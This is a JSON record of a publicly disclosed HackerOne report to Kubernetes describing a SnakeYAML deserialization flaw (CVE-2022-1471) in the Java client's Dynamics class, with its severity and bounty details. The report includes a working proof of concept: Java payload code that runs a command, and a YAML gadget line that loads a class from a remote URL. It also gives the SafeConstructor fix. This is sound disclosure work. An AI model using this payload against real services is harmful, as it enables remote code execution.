{
  "id": 1807214,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xODA3MjE0",
  "url": "https://hackerone.com/reports/1807214",
  "title": "The `io.kubernetes.client.util.generic.dynamic.Dynamics` contains a code execution vulnerability due to SnakeYAML",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2022-12-15T19:07:04.306Z",
  "submitted_at": "2022-12-15T19:07:04.446Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "jlleitschuh",
    "url": "/jlleitschuh",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/388/267/887b2ef55debfc7b243bdf563d314329cf750468_original.JPG/cccd3716a6d2e06174d2a41492445cb1d4bf85b4611a755bc810b9246a24d951"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 39386,
    "url": "https://hackerone.com/kubernetes",
    "handle": "kubernetes",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/039/386/486f4380e09776d05a912ca9f46be23f72fe8197_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/039/386/486f4380e09776d05a912ca9f46be23f72fe8197_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Kubernetes",
      "twitter_handle": "kubernetesio",
      "website": "https://kubernetes.io/",
      "about": ""
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [
    "CVE-2022-1471"
  ],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2023-04-25T16:44:21.223Z",
  "bug_reporter_agreed_on_going_public_at": "2023-04-25T16:44:21.086Z",
  "team_member_agreed_on_going_public_at": "2023-04-25T13:32:30.161Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "## Summary:\n\nIf the `io.kubernetes.client.util.generic.dynamic.Dynamics` is used to deserialize a `DynamicKubernetesObject `from untrusted YAML, an attacker can achieve code execution inside of the JVM.\n\nSince this is a part of the public API, down stream consumers can be using this API in a way that leaves them vulnerable. I have found no users of this class on GitHub outside of this project's unit tests. But that doesn't mean there are no users of this API. Someone built it for a reason, right?\n\n## Component Version:\n\nKubernettes Java Client version 17.0.0\n\n## Steps To Reproduce:\n\n1. Host a server with a JAR file containing the following code: \n```java\npackage org.jlleitschuh.sandbox;\n\nimport javax.script.ScriptEngine;\nimport javax.script.ScriptEngineFactory;\nimport java.io.IOException;\nimport java.util.List;\n\npublic class ScriptEngineFactoryRCE implements ScriptEngineFactory {\n    static {\n        try {\n            Runtime r = Runtime.getRuntime();\n            Process p = r.exec(\"open -a Calculator\");\n            p.waitFor();\n        } catch (IOException | InterruptedException e) {\n            throw new RuntimeException(e);\n        }\n    }\n\n    @Override\n    public String getEngineName() {\n        return null;\n    }\n\n    @Override\n    public String getEngineVersion() {\n        return null;\n    }\n\n    @Override\n    public List<String> getExtensions() {\n        return null;\n    }\n\n    @Override\n    public List<String> getMimeTypes() {\n        return null;\n    }\n\n    @Override\n    public List<String> getNames() {\n        return null;\n    }\n\n    @Override\n    public String getLanguageName() {\n        return null;\n    }\n\n    @Override\n    public String getLanguageVersion() {\n        return null;\n    }\n\n    @Override\n    public Object getParameter(String key) {\n        return null;\n    }\n\n    @Override\n    public String getMethodCallSyntax(String obj, String m, String... args) {\n        return null;\n    }\n\n    @Override\n    public String getOutputStatement(String toDisplay) {\n        return null;\n    }\n\n    @Override\n    public String getProgram(String... statements) {\n        return null;\n    }\n\n    @Override\n    public ScriptEngine getScriptEngine() {\n        return null;\n    }\n}\n```\n\nThe jar file must contain a file `/META-INF/services/javax.script.ScriptEngineFactory` with the contents `org.jlleitschuh.sandbox.ScriptEngineFactoryRCE    # Our RCE Payload`\n\nHost this jar file from a local server's root path.\n\nThen call the `Dynamics` yaml parsing APIs with the following payload:\n\n```yaml\n!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://localhost:8080/\"]]]]\n```\n\n## Fix\n\nThe SnakeYAML parser should be instantiated with the argument `new SafeConstructor()` in order to not be vulnerable to arbitrary deserialization.\n\n## Supporting Material/References:\n - https://bitbucket.org/snakeyaml/snakeyaml/issues/561/cve-2022-1471-vulnerability-in (I'm currently attempting to convince the maintainer of SnakeYaml to make this library secure by default, with limited sucsess)\n - https://nvd.nist.gov/vuln/detail/CVE-2022-1471\n - https://github.com/google/security-research/security/advisories/GHSA-mjmj-j48q-9wg2\n\n## Impact\n\nIf this Dynamics class is used to parse untrusted YAML, an attacker can achieve remote code execution",
  "bounty_amount": "1000.0",
  "formatted_bounty": "$1,000",
  "weakness": {
    "id": 70,
    "name": "Code Injection"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2023-05-25T13:32:30.351Z",
  "allow_singular_disclosure_after": -22813242.264361992,
  "singular_disclosure_allowed": true,
  "vote_count": 10,
  "voters": [
    "zy9ard3",
    "thruster",
    "shivammusic",
    "spetr0x",
    "paulovictor",
    "chris15",
    "bjj",
    "bublz79",
    "whitethehack",
    "agocdg"
  ],
  "severity": {
    "rating": "medium",
    "score": 6.7,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "local",
      "attack_complexity": "low",
      "privileges_required": "high",
      "user_interaction": "none",
      "scope": "unchanged",
      "confidentiality": "high",
      "integrity": "high",
      "availability": "high"
    }
  },
  "structured_scope": {
    "databaseId": 34405,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "https://github.com/kubernetes-client",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
